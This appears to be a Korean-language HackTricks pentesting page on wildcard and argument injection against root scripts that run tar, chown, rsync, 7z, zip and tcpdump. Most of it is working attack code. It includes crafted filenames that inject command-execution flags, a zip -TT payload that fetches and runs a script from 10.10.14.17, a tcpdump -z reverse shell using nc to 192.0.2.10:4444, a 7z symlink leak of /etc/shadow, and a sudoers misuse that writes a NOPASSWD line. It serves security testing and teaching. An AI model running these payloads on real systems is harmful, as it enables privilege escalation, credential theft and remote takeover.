# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard(또는 *glob*) **argument injection**은 권한이 높은 script가 `tar`, `chown`, `rsync`, `zip`, `7z` 등의 Unix binary를 `*`처럼 따옴표로 묶지 않은 wildcard와 함께 실행할 때 발생합니다.
> Shell은 binary를 실행하기 **전에** wildcard를 확장하므로, working directory에 파일을 생성할 수 있는 attacker는 `-`로 시작하는 filename을 만들어 해당 파일이 **data가 아닌 option**으로 해석되도록 할 수 있습니다. 결과적으로 임의의 flag 또는 command까지 몰래 전달할 수 있습니다.
> 이 페이지에서는 2023-2025년에 유용한 primitive, 최신 research 및 modern detection을 정리합니다.

## chown / chmod

`--reference` flag를 악용하면 **임의의 파일에서 owner/group 또는 permission bit를 복사**할 수 있습니다:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
root가 나중에 다음과 같은 것을 실행하면:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file`이 주입되어, 일치하는 *모든* 파일이 `/root/secret``file`의 소유권/권한을 상속합니다.

*PoC 및 tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).  
자세한 내용은 고전적인 DefenseCode 논문도 참조하세요.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

**checkpoint** 기능을 악용하여 임의의 명령을 실행합니다:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
root가 예를 들어 `tar -czf /root/backup.tgz *`를 실행하면 `shell.sh`가 root 권한으로 실행됩니다.

### bsdtar / macOS 14+

최근 macOS의 기본 `tar`(`libarchive` 기반)는 *`--checkpoint`를 구현하지 않지만*, 외부 compressor를 지정할 수 있는 **--use-compress-program** flag를 사용하면 여전히 code-execution을 수행할 수 있습니다.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
권한이 높은 script에서 `tar -cf backup.tar *`를 실행하면 `/bin/sh`가 시작됩니다.

---

## rsync

`rsync`에서는 `-e` 또는 `--rsync-path`로 시작하는 command-line flag를 통해 remote shell 또는 remote binary를 재정의할 수 있습니다:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
root가 나중에 `rsync -az * backup:/srv/`로 해당 디렉터리를 archive하면, 주입된 flag가 remote 측에서 shell을 실행합니다.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

privileged script가 option parsing을 막기 위해 wildcard 앞에 `--`를 *방어적으로* 붙이더라도, 7-Zip format은 파일 이름 앞에 `@`를 붙여 **file list files**를 지원합니다. 이를 symlink와 결합하면 *임의의 파일을 exfiltrate*할 수 있습니다:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
root가 다음과 같은 것을 실행한다면:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip은 `root.txt` (`→ /etc/shadow`)를 파일 목록으로 읽으려 시도한 후 중단하며, **내용을 stderr에 출력합니다**.

이는 `-- *`에서도 동작합니다. 7-Zip CLI가 일반 filename과 `@listfiles`를 positional input으로 명시적으로 모두 허용하므로, `@root.txt`와 같은 literal filename도 여전히 특별하게 처리됩니다.

---

## zip

애플리케이션이 사용자 제어 filename을 `zip`에 전달할 때(와일드카드를 사용하거나 `--` 없이 이름을 열거하는 경우) 매우 실용적인 primitive가 두 가지 존재합니다.

- RCE via test hook: `-T`는 “test archive”를 활성화하고, `-TT <cmd>`는 tester를 arbitrary program으로 교체합니다(긴 형식: `--unzip-command <cmd>`). `-`로 시작하는 filename을 inject할 수 있다면, short-options parsing이 작동하도록 flags를 서로 다른 filename으로 나누십시오:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
참고
- `'-T -TT <cmd>'`와 같은 단일 filename을 사용하려고 하지 마세요. short options는 문자별로 파싱되므로 실패합니다. 아래와 같이 별도의 token을 사용하세요.
- app에서 filename의 슬래시가 제거되는 경우, bare host/IP에서 가져오세요(default path는 `/index.html`). 그런 다음 `-O`를 사용해 로컬에 저장하고 execute하세요.
- `-sc`(processed argv 표시) 또는 `-h2`(추가 도움말)를 사용해 parsing을 debug하면 token이 어떻게 처리되는지 확인할 수 있습니다.

Example (local behavior on zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: 웹 레이어가 `zip` stdout/stderr를 그대로 출력하는 경우(naive wrapper에서 흔함), `--help`와 같은 injected flag 또는 잘못된 option으로 인한 오류가 HTTP response에 노출되어 command-line injection을 확인하고 payload를 조정하는 데 도움이 됩니다.

---

## wildcard injection에 취약한 추가 binary (2023-2025 quick list)

다음 command들은 최신 CTF와 실제 환경에서 악용되었습니다. payload는 나중에 wildcard와 함께 처리될 writable directory 내부의 *filename*으로 항상 생성됩니다:

| Binary | 악용할 Flag | 효과 |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → 임의의 `@file` | 파일 내용 읽기 |
| `flock` | `-c <cmd>` | command 실행 |
| `git`   | `-c core.sshCommand=<cmd>` | SSH를 통한 git에서 command execution |
| `scp`   | `-S <cmd>` | ssh 대신 임의의 program spawn |

이러한 primitive는 *tar/rsync/zip* classic보다 덜 흔하지만, hunting 시 확인할 가치가 있습니다.

---

## 취약한 wrapper와 job hunting

최근 case study에 따르면 wildcard/argv injection은 더 이상 **cron + tar** 문제에만 국한되지 않습니다. 동일한 bug class는 다음과 같은 곳에서 계속 나타납니다:

- attacker-controlled upload directory에서 "download everything as zip/tar"를 제공하는 web feature
- attacker-controlled filename/filter field가 있는 **tcpdump** wrapper를 노출하는 vendor/appliance debug shell
- writable directory에서 `tar`, `rsync`, `7z`, `zip`, `chown` 또는 `chmod`를 실행하는 backup 또는 rotation job

유용한 triage command:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
빠른 휴리스틱:

- `-- *`는 많은 GNU 도구에서 좋은 해결책이지만, `@listfiles`가 별도로 파싱되는 `7z`/`7za`에는 적용되지 않습니다.
- `zip`의 경우, 사용자가 제어하는 파일 이름을 직접 열거하는 wrapper를 찾아보세요. shell glob이 없어도 short-option splitting(`-T` + `-TT <cmd>`)은 여전히 작동합니다.
- `tcpdump`의 경우 **output file names**, **rotation settings** 또는 **capture-file replay** 인자를 제어할 수 있도록 허용하는 wrapper에 특히 주의하세요.

---

## tcpdump rotation hooks (-G/-W/-z): wrapper의 argv injection을 통한 RCE

제한된 shell 또는 vendor wrapper가 엄격한 quoting/validation 없이 사용자가 제어하는 필드(예: "file name" parameter)를 연결하여 `tcpdump` command line을 구성하는 경우, 추가 `tcpdump` flags를 몰래 삽입할 수 있습니다. `-G`(time-based rotation), `-W`(파일 수 제한), `-z <cmd>`(post-rotate command)의 조합을 사용하면 `tcpdump`를 실행하는 사용자의 권한으로 임의의 command를 실행할 수 있습니다(appliance에서는 root인 경우가 많음).

사전 조건:

- `tcpdump`에 전달되는 `argv`를 제어할 수 있어야 합니다(예: `/debug/tcpdump --filter=... --file-name=<HERE>`와 같은 wrapper를 통해).
- wrapper가 file name 필드에서 공백 또는 `-`로 시작하는 token을 sanitize하지 않아야 합니다.

Classic PoC(쓰기 가능한 경로의 reverse shell script를 실행):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
세부 사항:

- `-G 1 -W 1`은 첫 번째 일치하는 패킷 이후 즉시 rotate가 발생하도록 강제합니다.
- `-z <cmd>`는 각 rotate마다 post-rotate command를 한 번 실행합니다. 많은 build에서는 `<cmd> <savefile>`을 실행합니다. `<cmd>`가 script/interpreter인 경우, argument 처리가 payload와 일치하는지 확인하세요.

외부 미디어가 필요 없는 variants:

- 파일을 작성할 수 있는 다른 primitive이 있다면(예: output redirection을 허용하는 별도의 command wrapper), script를 알려진 path에 저장한 다음 플랫폼 semantics에 따라 `-z /bin/sh /path/script.sh` 또는 `-z /path/script.sh`를 trigger하세요.
- 일부 vendor wrapper는 attacker가 제어할 수 있는 location으로 rotate합니다. rotated path에 영향을 줄 수 있다면(symlink/directory traversal), 외부 미디어 없이도 완전히 제어하는 content를 실행하도록 `-z`를 유도할 수 있습니다.

---

## sudoers: wildcards/additional args가 있는 tcpdump → arbitrary write/read 및 root

매우 흔한 sudoers anti-pattern:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
문제
- `*` glob 및 permissive pattern은 첫 번째 `-w` argument만 제한합니다. `tcpdump`는 여러 `-w` options를 허용하며, 마지막 항목이 적용됩니다.
- 이 rule은 다른 options를 제한하지 않으므로 `-Z`, `-r`, `-V` 등을 사용할 수 있습니다.

Primitives
- 두 번째 `-w`로 destination path를 override합니다(첫 번째 항목은 sudoers만 충족).
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- 제한된 트리에서 벗어나기 위한 첫 번째 `-w` 내부의 Path traversal:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-Z root`으로 출력 소유권 강제 (어디서든 root 소유 파일 생성):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-r`을 통해 조작된 PCAP을 재생하여 임의의 콘텐츠를 쓰기(예: sudoers 줄을 추가):

<details>
<summary>정확한 ASCII payload가 포함된 PCAP을 생성하고 root 권한으로 쓰기</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- `-V <file>`을 사용한 임의 파일 읽기/secret leak (저장 파일 목록으로 해석됨). 오류 진단 메시지가 줄을 그대로 출력하는 경우가 많아 콘텐츠가 leak될 수 있음:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## 참고 자료

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - 전체 Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [Elastic - Wildcard Injection을 통한 Potential Shell 탐지](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)

{{#include ../../banners/hacktricks-training.md}}
